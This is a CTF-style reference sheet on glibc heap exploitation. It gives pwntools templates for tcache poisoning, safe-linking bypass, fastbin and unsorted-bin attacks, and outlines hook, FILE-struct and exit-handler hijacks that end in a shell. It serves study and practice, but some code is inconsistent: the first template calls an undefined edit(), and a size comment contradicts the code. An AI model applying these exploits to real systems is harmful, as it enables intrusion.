# Heap Exploitation (Heap Pwn)

## Differences in glibc Versions (Must Read)

All heap exploitation techniques are tightly bound to the version of glibc. First, confirm the version:

```bash
./libc.so.6 | head -1
# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.

# Or strings
strings ./libc.so.6 | grep "GNU C Library"
```

| glibc Version | Key Changes | Impact |
|---------------|-------------|--------|
| 2.26 and before | No tcache   | Unsorted/fastbin are the main battlefield |
| 2.27          | **Introduce tcache** | Tcache poisoning is extremely simple |
| 2.29          | Unsorted bin unlink reinforcement (chunk size check) | Unsorted bin attack is cut off |
| 2.31          | Multiple checks on tcache (key field) | Tcache poisoning becomes slightly more complex |
| 2.32          | **Safe-linking** (fd pointer XOR PROTECT_PTR) | Need to leak heap base first |
| 2.34          | **Remove __free_hook / __malloc_hook** | Switch to FILE struct / exit handlers |
| 2.35+         | Further reinforcement | Same as 2.34, FILE path is still available |

## Tcache Poisoning (2.27 - 2.31)

### Principle

Tcache is a per-thread cache, with each size class having a single linked list (only fd).

Double free checks before 2.29 only look at whether the head of the list is itself and do not traverse.

### Exploitation Template (2.27 - 2.31)

```python
from pwn import *

p = process('./vuln')
libc = ELF('./libc.so.6')

def add(idx, size, data=b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

# === Step 1: Leak libc base ===
# Allocate a chunk larger than the tcache range (>0x408), free it to the unsorted bin, leaving the main_arena pointer behind
for i in range(8):
    add(i, 0x80)
add(8, 0x80)  # Prevent merging
for i in range(7):
    free(i)
free(7)       # The 8th one goes to the unsorted bin, fd/bk pointing to main_arena+96
add(9, 0x80)  # Switch back a bit to keep fd
leak = u64(show(9).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0  # Offset from main_arena+96, glibc 2.27 amd64
log.success(f'libc = {hex(libc.address)}')

# === Step 2: Tcache poisoning → Write __free_hook ===
add(10, 0x30)
add(11, 0x30)
free(10)
free(11)
# Use UAF to change the fd of chunk11 to point to __free_hook
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # Retrieve chunk11
add(13, 0x30, p64(libc.sym['system']))  # The retrieved one is the address of __free_hook, write system

# Trigger: Free a chunk with content "/bin/sh\x00"
add(14, 0x30, b'/bin/sh\x00')
free(14)

p.interactive()
```

## safe-linking Bypass (2.32+)

```text
Principle: When writing to the fd in tcache/fastbin, PROTECT_PTR is used:
    PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr

Bypass:
1. Must first leak a heap address (heap base)
2. Calculate the obfuscated value: fake_fd_obf = (chunk_addr >> 12) ^ target
3. Write it in
```

```python
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

# Leak heap base (unsorted bin residual / tcache fd residual)
heap_base = leaked_heap & ~0xfff

# Poisoning
fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
edit(chunk_id, p64(fake_fd))
```

## Fastbin Attack (Traditional, up to 2.26)

```text
Key points:
1. Fastbin is a singly linked list (only fd), with no size check except that the chunk size must match
2. After 2.27, tcache takes precedence; fastbin only uses it when tcache is full
3. Still need to forge a memory block that looks like a chunk (size field = true chunk size, ± some)
```

```python
# Double free
add(0, 0x60)
add(1, 0x60)
free(0)
free(1)
free(0)  # fastbin: 0 → 1 → 0

# Change fd to fake chunk (requires the size byte at fake_addr + 8 to match 0x70)
add(2, 0x60, p64(fake_addr))
add(3, 0x60)
add(4, 0x60)  # Take out the chunk from fake_addr
```

## Unsorted Bin Attack (Only up to 2.28)

```text
Principle: Write any address to main_arena+88
Since 2.29, there is a check that bck->fd == victim, which cannot be bypassed
Purpose: Overwrite global_max_fast to let small chunks also use fastbin → Combine with fastbin attack
Advanced technique, often used in combinations like House of Husk
```

```python
# Allocate an unsorted size chunk
add(0, 0x100)
add(1, 0x100)  # Prevent top consolidation
free(0)
# UAF change bk pointer to target - 0x10
edit(0, p64(0) + p64(target - 0x10))
add(2, 0x100)  # Take out the chunk from unsorted → unlink → write main_arena+88 to target
```

## Large Bin Attack

```text
Principle: Large bin has an additional layer of fd_nextsize / bk_nextsize compared to unsorted
Since 2.32, there is also a check for chunk size, but it can still be used to change global_max_fast, _IO_list_all, etc.
Advanced technique, often used in combinations like House of Husk
```

## House of XXX Quick Reference

| Name | Applicable Version | Core Idea |
|------|-----------------|-----------|
| House of Force | up to 2.28 | Change top chunk size to a large value → malloc any address |
| House of Lore | All versions | Forge small bin chain → Return any address |
| House of Orange | 2.23-2.30 | Unsorted attack change _IO_list_all to trigger _IO_flush_all_lockp |
| House of Roman | 2.23-2.26 | 12-bit brute force + fastbin attack to __malloc_hook |
| House of Einherjar | All versions | Forge prev_size + PREV_INUSE=0 → backward consolidation |
| House of Botcake | 2.27+ | tcache + unsorted bin combination, bypass tcache double free check |
| House of Husk | 2.27+ | Change printf's hook table (__printf_function_table) |
| House of Cat | 2.34+ | _IO_wfile_seekoff vtable exploitation, for versions without hooks |
| House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |

## Real Exploitation Steps (General 4 Steps)

```text
Step 1: Leak heap base
  - Allocate a chunk → free to tcache (2.32+ retains obfuscated fd) → show → reverse-engineer the heap
  - Or: Allocate a large chunk → free to unsorted → switch back → show fd

Step 2: Leak libc base
  - Large chunk freed to unsorted bin, fd/bk remnants of main_arena address
  - Show → leak → libc.address = leak - main_arena_offset

Step 3: Control IP
  - 2.27-2.33: tcache/fastbin poisoning → write __free_hook or __malloc_hook
  - 2.34+: FILE struct attack (_IO_2_1_stdout_ / stderr), modify vtable → _IO_wfile_jumps
  - Or: hijack exit handlers (__exit_funcs / tls_dtor_list)

Step 4: Getshell
  - free_hook = system, free("/bin/sh") → shell
  - 2.34+: setcontext + 53 gadget → rop chain in heap → execve
```

## Alternative Paths After Hooking libc 2.34+

### FILE struct Attack (_IO_2_1_stdout_ / _IO_2_1_stderr_)

```text
Target: When the program calls puts/printf, it eventually reaches _IO_file_xsputn → _IO_OVERFLOW → calls vtable
Hijacking:
  1. Overwrite the vtable pointer of _IO_2_1_stderr_ to point to a fake vtable
  2. Fake vtable, make __overflow field point to system or setcontext
  3. Make the fp (FILE*) itself's first 8 bytes "/bin/sh\x00" (as rdi for system)
Trigger: Any puts/printf/abort/exit will flush stderr
```

### Exit handlers (`__exit_funcs` / `tls_dtor_list`)

```text
Principle: __run_exit_handlers iterates over the __exit_funcs list and calls each dtor
Hijacking: Change the func pointer of the linked list node to point to system, arg to "/bin/sh"
Note: 2.34+ added PTR_DEMANGLE, need to leak the fs:[0x30] guard value from tls to fake
```

### tls_dtor_list (More Modern)

```text
__call_tls_dtors iterates over it, similar structure, also needs to bypass PTR_DEMANGLE
Applicable: When the program exits, this is taken, more universal than FILE attack
```

## pwndbg / GEF Heap Debugging Commands

```text
# pwndbg
heap              # Display all chunks of the current arena
bins              # Display tcache / fastbin / unsorted / small / large bins
tcache            # View only tcache
find_fake_fast <addr> <size>  # Find a writable point for fd to use as a fake chunk
vis_heap_chunks   # Visualize heap layout

# GEF
heap chunks
heap bins fast
heap bins tcache
heap chunk <addr>
```

## Typical pwntools Template (Heap Menu CTF)

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process('./vuln') if not args.REMOTE else remote('host', 1337)

# IO Wrapper
def menu(choice):
    p.sendlineafter(b'choice:', str(choice).encode())

def add(idx, size, data=b'\n'):
    menu(1)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data != b'\n':
        p.sendafter(b'data:', data)

def free(idx):
    menu(2)
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    menu(3)
    p.sendlineafter(b'idx:', str(idx).encode())
    return p.recvline().strip()

def edit(idx, data):
    menu(4)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# === Choose the appropriate technique stack based on the vulnerability type ===
```

## Notes

- **glibc version is the first priority** — The same binary with 2.27 libc and 2.34 libc has completely different exploitation paths.
- **tcache capacity = 7** (per size class) — You need to spray at least 7 chunks to overflow into the unsorted/fastbin.
- **chunk size = user request + 0x10 header, aligned to 0x10** (the actual writable space exceeds 0x8 because the next chunk's prev_size is reused).
- **Remote heap spraying is unstable** — The server uses a fork model where brk/mmap may differ each connection. Randomized testing is needed.
- **Do not leave unsorted leftovers in the attack chain** — A main_arena pointer appearing in an unexpected chunk will cause subsequent show outputs to be混乱.
- **safe-linking error rate** — Remember that when calculating PROTECT_PTR, it should be `pos >> 12`, where pos is the address to write, not the address to point to.